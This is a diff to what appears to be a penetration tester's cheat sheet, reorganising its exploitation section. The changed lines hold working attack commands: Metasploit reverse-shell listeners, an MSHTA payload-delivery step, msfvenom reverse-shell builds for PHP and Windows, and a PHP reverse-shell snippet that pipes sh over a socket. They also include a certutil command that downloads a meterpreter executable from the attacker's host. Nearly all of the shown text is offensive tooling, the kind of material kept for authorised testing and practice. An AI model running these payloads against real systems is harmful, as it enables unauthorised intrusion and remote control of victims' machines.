@@ -152,14 +152,19 @@ bloodhound-python -c all -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "
 bloodhound-python -c default -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
 
 # Exploitation
-## Reverse Shell Listeners
-rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
-rlwrap msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 4444; run"
+## Listeners
 rlwrap msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
-nc -lvnp 4444
+rlwrap nc -lvnp 4444
+
+[*] MSHTA
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
+mshta.exe http://$MYIP:8080/nZzLAD.hta
+sessions -i 1
 
 ## Web
 [*] Reverse Shell
+rlwrap msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 4444; run"
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f raw > msfshell.php
 <?php
     $lhost = "$MYIP";
     $lport = 4444;
@@ -170,7 +175,6 @@ nc -lvnp 4444
         exec("sh <&3 >&3 2>&3");
         }
 ?>
-msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f raw > msfshell.php
 
 [*] Web Shell
 <html>
@@ -438,20 +442,12 @@ export TERM=xterm-256color;
 stty rows <num> columns <num>
 reset
 
-[*] 
-
 ## Windows
-[*] MSHTA
-msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
-mshta.exe http://$MYIP:8080/nZzLAD.hta
-sessions -i 1
-
 [*] Metasploit
 python3 -m http.server 80 -d ~/Downloads/upload
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o meterpreter86.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o meterpreter64.exe
-cp meterpreter64.exe meterpreter.exe
-powershell -c 'certutil -urlcache -f http://$MYIP:8088/meterpreter.exe C:\programdata\meterpreter.exe'
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o msfshell86.exe; cp msfshell86.exe msfshell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f exe -o msfshell64.exe; cp msfshell64.exe msfshell.exe
+powershell -c 'certutil -urlcache -f http://$MYIP:8088/msfshell.exe C:\programdata\msfshell.exe'
 
 getuid
 getprivs
